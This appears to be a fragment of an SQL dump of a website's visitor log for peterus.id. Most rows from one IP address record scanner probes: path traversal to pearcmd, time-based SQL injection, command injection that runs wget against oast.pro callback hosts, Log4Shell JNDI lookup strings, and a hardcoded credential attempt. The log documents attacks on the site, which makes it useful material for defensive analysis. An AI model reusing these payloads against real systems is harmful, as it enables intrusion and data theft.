(28, '149.57.180.55', 'Mozilla/5.0 (X11; Linux i686; rv:109.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id', '2025-06-26 12:48:53', '2025-06-26 12:48:53'),
(29, '194.50.16.252', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.9.21', 'https://www.peterus.id', '2025-06-26 14:18:24', '2025-06-26 14:18:24'),
(30, '157.55.39.203', 'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36', 'https://peterus.id', '2025-06-26 21:25:20', '2025-06-26 21:25:20'),
(31, '15.204.182.106', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 01:26:39', '2025-06-27 01:26:39'),
(32, '15.204.182.106', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 01:39:13', '2025-06-27 01:39:13'),
(33, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0', 'https://peterus.id', '2025-06-27 02:36:38', '2025-06-27 02:36:38'),
(34, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'https://peterus.id/?lang=..%2F..%2F..%2F..%2F..%2Fusr%2Flocal%2Fphp%2Fpearcmd', '2025-06-27 02:40:39', '2025-06-27 02:40:39'),
(35, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 02:40:41', '2025-06-27 02:40:41'),
(36, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2 Safari/605.1.15', 'https://peterus.id/?%2Fsafedog%28%29%20nyGQ7Fnpe1.log=&config-create%20%2F=&lang=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Flocal%2Flib%2Fphp%2Fpearcmd', '2025-06-27 02:40:42', '2025-06-27 02:40:42'),
(37, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0', 'https://peterus.id', '2025-06-27 03:24:06', '2025-06-27 03:24:06'),
(38, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', 'https://peterus.id/?lang=..%2F..%2F..%2F..%2F..%2Fusr%2Flocal%2Fphp%2Fpearcmd', '2025-06-27 03:24:15', '2025-06-27 03:24:15'),
(39, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://peterus.id', '2025-06-27 03:24:17', '2025-06-27 03:24:17'),
(40, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/104.0 Safari/537.36', 'https://peterus.id/?%2Fsafedog%28%29%20FpR8GRTzyM.log=&config-create%20%2F=&lang=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Flocal%2Flib%2Fphp%2Fpearcmd', '2025-06-27 03:24:19', '2025-06-27 03:24:19'),
(41, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux i686; rv:130.0) Gecko/20100101 Firefox/130.0', 'https://www.peterus.id', '2025-06-27 03:31:00', '2025-06-27 03:31:00'),
(42, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'https://www.peterus.id/?lang=..%2F..%2F..%2F..%2F..%2Fusr%2Flocal%2Fphp%2Fpearcmd', '2025-06-27 03:31:00', '2025-06-27 03:31:00'),
(43, '156.246.17.42', 'Mozilla/5.0 (Windows NT 11.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/109.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 03:31:01', '2025-06-27 03:31:01'),
(44, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://www.peterus.id/?%2Fsafedog%28%29%209CK9p3iv85.log=&config-create%20%2F=&lang=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Flocal%2Flib%2Fphp%2Fpearcmd', '2025-06-27 03:31:03', '2025-06-27 03:31:03'),
(45, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://peterus.id', '2025-06-27 03:42:42', '2025-06-27 03:42:42'),
(46, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 Edge/12.0 PromptMapper/9.0.3.2', 'https://peterus.id', '2025-06-27 03:43:03', '2025-06-27 03:43:03'),
(47, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 03:46:58', '2025-06-27 03:46:58'),
(48, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686; rv:123.0) Gecko/20100101 Firefox/123.0', 'https://www.peterus.id', '2025-06-27 03:47:15', '2025-06-27 03:47:15'),
(49, '156.246.17.42', NULL, 'https://peterus.id/?author=1', '2025-06-27 03:49:05', '2025-06-27 03:49:05'),
(50, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://peterus.id/?gf_page=upload', '2025-06-27 03:51:57', '2025-06-27 03:51:57'),
(51, '156.246.17.42', NULL, 'https://www.peterus.id/?author=1', '2025-06-27 03:52:29', '2025-06-27 03:52:29'),
(52, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://peterus.id', '2025-06-27 03:54:52', '2025-06-27 03:54:52'),
(53, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 03:57:39', '2025-06-27 03:57:39'),
(54, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'https://www.peterus.id/?gf_page=upload', '2025-06-27 03:57:56', '2025-06-27 03:57:56'),
(55, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/123.0 Safari/537.36', 'https://peterus.id', '2025-06-27 04:02:11', '2025-06-27 04:02:11'),
(56, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 04:04:50', '2025-06-27 04:04:50'),
(57, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 04:05:01', '2025-06-27 04:05:01'),
(58, '156.246.17.42', 'Mozilla/5.0 (Windows NT 11.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/113.0 Safari/537.36', 'https://peterus.id', '2025-06-27 04:05:06', '2025-06-27 04:05:06'),
(59, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_16) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15', 'https://peterus.id', '2025-06-27 04:05:55', '2025-06-27 04:05:55'),
(60, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686; rv:133.0) Gecko/20100101 Firefox/133.0', 'https://www.peterus.id', '2025-06-27 04:08:08', '2025-06-27 04:08:08'),
(61, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0', 'https://www.peterus.id', '2025-06-27 04:08:25', '2025-06-27 04:08:25'),
(62, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 04:08:56', '2025-06-27 04:08:56'),
(63, '156.246.17.42', 'Mozilla/5.0 (Windows; U; Windows NT 6.0; fr-FR) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16', 'https://peterus.id', '2025-06-27 04:18:13', '2025-06-27 04:18:13'),
(64, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://peterus.id', '2025-06-27 04:18:17', '2025-06-27 04:18:17'),
(65, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 04:21:08', '2025-06-27 04:21:08'),
(66, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 04:22:21', '2025-06-27 04:22:21'),
(67, '156.246.17.42', 'Mozilla/5.0 (Knoppix; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 04:22:25', '2025-06-27 04:22:25'),
(68, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0', 'https://peterus.id/?echo%20LQoUhJvHed=', '2025-06-27 04:22:32', '2025-06-27 04:22:32'),
(69, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://www.peterus.id', '2025-06-27 04:23:11', '2025-06-27 04:23:11'),
(70, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15', 'https://peterus.id', '2025-06-27 04:23:49', '2025-06-27 04:23:49'),
(71, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586', 'https://www.peterus.id/?echo%20LQoUhJvHed=', '2025-06-27 04:24:25', '2025-06-27 04:24:25'),
(72, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.2 Mobile/15E148 Safari/604.1', 'https://www.peterus.id', '2025-06-27 04:28:35', '2025-06-27 04:28:35'),
(73, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1', 'https://peterus.id', '2025-06-27 04:30:32', '2025-06-27 04:30:32'),
(74, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://www.peterus.id', '2025-06-27 04:32:59', '2025-06-27 04:32:59'),
(75, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 04:36:48', '2025-06-27 04:36:48'),
(76, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://peterus.id/?pum_action=tools_page_tab_system_info', '2025-06-27 04:38:04', '2025-06-27 04:38:04'),
(77, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1', 'https://www.peterus.id', '2025-06-27 04:38:35', '2025-06-27 04:38:35'),
(78, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux i686; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://www.peterus.id/?pum_action=tools_page_tab_system_info', '2025-06-27 04:41:47', '2025-06-27 04:41:47'),
(79, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0', 'https://peterus.id', '2025-06-27 04:44:49', '2025-06-27 04:44:49'),
(80, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 04:46:38', '2025-06-27 04:46:38'),
(81, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0', 'https://peterus.id', '2025-06-27 04:51:46', '2025-06-27 04:51:46'),
(82, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 04:53:51', '2025-06-27 04:53:51'),
(83, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 04:58:09', '2025-06-27 04:58:09'),
(84, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0', 'https://www.peterus.id', '2025-06-27 05:03:23', '2025-06-27 05:03:23'),
(85, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://peterus.id/?p=1', '2025-06-27 05:17:12', '2025-06-27 05:17:12'),
(86, '156.246.17.42', 'Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15', 'https://peterus.id/index.php?controller=CommentGrade&fc=module&id_products%5B0%5D=%28select%2Afrom%28select%28sleep%286%29%29%29a%29&module=productcomments', '2025-06-27 05:20:50', '2025-06-27 05:20:50'),
(87, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://www.peterus.id/?p=1', '2025-06-27 05:21:49', '2025-06-27 05:21:49'),
(88, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.8.1 Mobile/15E148 Safari/604.1', 'https://www.peterus.id/index.php?controller=CommentGrade&fc=module&id_products%5B0%5D=%28select%2Afrom%28select%28sleep%286%29%29%29a%29&module=productcomments', '2025-06-27 05:23:27', '2025-06-27 05:23:27'),
(89, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15', 'https://peterus.id', '2025-06-27 05:26:02', '2025-06-27 05:26:02'),
(90, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0', 'https://peterus.id', '2025-06-27 05:26:03', '2025-06-27 05:26:03'),
(91, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0', 'https://www.peterus.id', '2025-06-27 05:28:54', '2025-06-27 05:28:54'),
(92, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0', 'https://peterus.id', '2025-06-27 05:31:31', '2025-06-27 05:31:31'),
(93, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'https://peterus.id/?password=PrOw%21aN_fXp&username=zyfwp', '2025-06-27 05:32:28', '2025-06-27 05:32:28'),
(94, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 05:34:26', '2025-06-27 05:34:26'),
(95, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 05:34:27', '2025-06-27 05:34:27'),
(96, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15', 'https://www.peterus.id/?password=PrOw%21aN_fXp&username=zyfwp', '2025-06-27 05:38:04', '2025-06-27 05:38:04'),
(97, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://peterus.id/index.php?app=main&inc=core_auth&route=login', '2025-06-27 05:44:32', '2025-06-27 05:44:32'),
(98, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'https://peterus.id/?author=1', '2025-06-27 05:47:03', '2025-06-27 05:47:03'),
(99, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1', 'https://www.peterus.id/index.php?app=main&inc=core_auth&route=login', '2025-06-27 05:48:51', '2025-06-27 05:48:51'),
(100, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36', 'https://www.peterus.id/?author=1', '2025-06-27 05:51:35', '2025-06-27 05:51:35'),
(101, '156.246.17.42', 'Mozilla/5.0 (Ubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36', 'https://peterus.id', '2025-06-27 05:57:51', '2025-06-27 05:57:51'),
(102, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/601.6.17 (KHTML, like Gecko) Version/9.1.1 Safari/601.6.17', 'https://www.peterus.id', '2025-06-27 06:02:02', '2025-06-27 06:02:02'),
(103, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://peterus.id/?discount_code=%27%20%20union%20select%20sleep%286%29%20--%20g&level_id=3&rest_route=%2Fpmpro%2Fv1%2Fcheckout_level', '2025-06-27 06:12:46', '2025-06-27 06:12:46'),
(104, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Safari/103.0 Safari/537.36', 'https://peterus.id', '2025-06-27 06:14:36', '2025-06-27 06:14:36'),
(105, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10', 'https://www.peterus.id', '2025-06-27 06:16:40', '2025-06-27 06:16:40'),
(106, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686; rv:121.0) Gecko/20100101 Firefox/121.0', 'https://www.peterus.id/?discount_code=%27%20%20union%20select%20sleep%286%29%20--%20g&level_id=3&rest_route=%2Fpmpro%2Fv1%2Fcheckout_level', '2025-06-27 06:17:13', '2025-06-27 06:17:13'),
(107, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', 'https://peterus.id', '2025-06-27 06:20:24', '2025-06-27 06:20:24'),
(108, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0', 'https://peterus.id', '2025-06-27 06:20:24', '2025-06-27 06:20:24'),
(109, '156.246.17.42', 'Mozilla/5.0 (Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Safari/107.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 06:22:19', '2025-06-27 06:22:19'),
(110, '156.246.17.42', 'Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0', 'https://www.peterus.id', '2025-06-27 06:22:19', '2025-06-27 06:22:19'),
(111, '156.246.17.42', 'Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15', 'https://peterus.id/index.php?controller=CommentGrade&fc=module&id_products%5B0%5D=1%20AND%20%28SELECT%203875%20FROM%20%28SELECT%28SLEEP%288%29%29%29xoOt%29&module=productcomments', '2025-06-27 06:25:47', '2025-06-27 06:25:47'),
(112, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36', 'https://peterus.id/?action=command&command=set_city_timezone&value=%24%28wget%20http%3A%2F%2Fd1f0llipp1o26gc6gergdjjycicdfk4hg.oast.pro%29%29', '2025-06-27 06:27:44', '2025-06-27 06:27:44'),
(113, '156.246.17.42', 'Mozilla/5.0 (Windows NT 6.2; rv:128.9) Gecko/20100101 Firefox/128.9', 'https://www.peterus.id/?action=command&command=set_city_timezone&value=%24%28wget%20http%3A%2F%2Fd1f0llipp1o26gc6gergrc1fyipq3bxrg.oast.pro%29%29', '2025-06-27 06:29:37', '2025-06-27 06:29:37'),
(114, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0', 'https://www.peterus.id/index.php?controller=CommentGrade&fc=module&id_products%5B0%5D=1%20AND%20%28SELECT%203875%20FROM%20%28SELECT%28SLEEP%288%29%29%29xoOt%29&module=productcomments', '2025-06-27 06:29:46', '2025-06-27 06:29:46'),
(115, '114.79.4.77', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36', 'https://peterus.id', '2025-06-27 06:35:14', '2025-06-27 06:35:14'),
(116, '156.246.17.42', 'Mozilla/5.0 (Debian; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36', 'https://peterus.id/index.php', '2025-06-27 06:38:10', '2025-06-27 06:38:10'),
(117, '156.246.17.42', 'Mozilla/5.0 (SS; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0', 'https://www.peterus.id/index.php', '2025-06-27 06:41:44', '2025-06-27 06:41:44'),
(118, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://peterus.id', '2025-06-27 06:43:37', '2025-06-27 06:43:37'),
(119, '156.246.17.42', 'Mozilla/5.0 (Macintosh: Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3.1 Safari/605.1.15', 'https://peterus.id', '2025-06-27 06:43:41', '2025-06-27 06:43:41'),
(120, '114.79.4.77', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36', 'https://peterus.id', '2025-06-27 06:44:12', '2025-06-27 06:44:12'),
(121, '156.246.17.42', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0', 'https://peterus.id', '2025-06-27 06:44:22', '2025-06-27 06:44:22'),
(122, '156.246.17.42', '${jndi:ldap://127.0.0.1#.${hostName}.useragent.d1f0llipp1o26gc6gerg9z5xjz75tpheq.oast.pro}', 'https://peterus.id/?x=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1', '2025-06-27 06:47:02', '2025-06-27 06:47:02'),
(123, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.7 Mobile/15E148 Safari/604.1', 'https://peterus.id', '2025-06-27 06:47:02', '2025-06-27 06:47:02'),
(124, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 06:48:02', '2025-06-27 06:48:02'),
(125, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15', 'https://www.peterus.id', '2025-06-27 06:48:06', '2025-06-27 06:48:06'),
(126, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36', 'https://www.peterus.id', '2025-06-27 06:48:12', '2025-06-27 06:48:12'),
(127, '156.246.17.42', '${jndi:ldap://127.0.0.1#.${hostName}.useragent.d1f0llipp1o26gc6gergga6tczkesrcsm.oast.pro}', 'https://www.peterus.id/?x=%24%7Bjndi%3Aldap%3A%2F%2F127.0.0.1', '2025-06-27 06:49:05', '2025-06-27 06:49:05'),
(128, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Safari/605.1.15', 'https://peterus.id/?x=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-530%7D%24%7B%3A-199%7D.%24%7BhostName%7D.uri.d1f0llipp1o26gc6gergdq9x6mozxw4a7.oast.pro%2Fa%7D', '2025-06-27 06:49:20', '2025-06-27 06:49:20'),
(129, '156.246.17.42', '${jndi:ldap://${:-530}${:-199}.${hostName}.useragent.d1f0llipp1o26gc6gergbzbifr37b5irr.oast.pro}', 'https://peterus.id', '2025-06-27 06:49:24', '2025-06-27 06:49:24'),
(130, '156.246.17.42', 'Mozilla/5.0 (Kubuntu; Linux i686; rv:132.0) Gecko/20100101 Firefox/132.0', 'https://www.peterus.id', '2025-06-27 06:51:09', '2025-06-27 06:51:09'),
(131, '156.246.17.42', 'Mozilla/5.0 (CentOS; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36', 'https://peterus.id/index.php?destination=&p=member', '2025-06-27 06:51:24', '2025-06-27 06:51:24'),
(132, '114.79.4.77', 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36', 'https://peterus.id', '2025-06-27 06:51:43', '2025-06-27 06:51:43'),
(133, '156.246.17.42', 'Mozilla/5.0 (ZZ; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0', 'https://peterus.id/?item_id=0%20union%20select%20sleep%287%29%20--%20g&rest_route=%2Fwc%2Fv3%2Fwishlist%2Fremove_product%2F1', '2025-06-27 06:52:55', '2025-06-27 06:52:55'),
(134, '156.246.17.42', 'Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36', 'https://peterus.id/?post_ids=0%29%20union%20select%20md5%28999999999%29%2Cnull%2Cnull%20--%20g&rest_route=%2Fpvc%2Fv1%2Fincrease%2F1', '2025-06-27 06:53:21', '2025-06-27 06:53:21'),
(135, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'https://www.peterus.id/?x=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-530%7D%24%7B%3A-199%7D.%24%7BhostName%7D.uri.d1f0llipp1o26gc6gergh1q1mnnp4fbax.oast.pro%2Fa%7D', '2025-06-27 06:53:29', '2025-06-27 06:53:29'),
(136, '156.246.17.42', '${jndi:ldap://${:-530}${:-199}.${hostName}.useragent.d1f0llipp1o26gc6gerg6xfshm47goez1.oast.pro}', 'https://www.peterus.id', '2025-06-27 06:53:33', '2025-06-27 06:53:33'),
(137, '156.246.17.42', 'Mozilla/5.0 (X11; Linux i686; rv:126.0) Gecko/20100101 Firefox/126.0', 'https://peterus.id', '2025-06-27 06:53:39', '2025-06-27 06:53:39'),
(138, '156.246.17.42', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15', 'https://peterus.id', '2025-06-27 06:53:50', '2025-06-27 06:53:50'),
